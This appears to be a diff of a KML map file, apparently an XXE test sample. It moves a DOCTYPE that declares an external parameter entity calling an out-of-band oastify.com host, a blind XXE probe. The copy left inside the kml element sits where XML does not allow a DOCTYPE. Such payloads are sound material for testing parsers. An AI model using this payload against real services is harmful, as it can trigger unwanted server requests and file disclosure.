@@ -1,5 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://3y27aukfdns7qvtub6i2i92gr7xyl29r.oastify.com"> %xxe;]>
 <kml xmlns="http://www.opengis.net/kml/2.2">
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://3y27aukfdns7qvtub6i2i92gr7xyl29r.oastify.com"> %xxe;]>
   <Document>
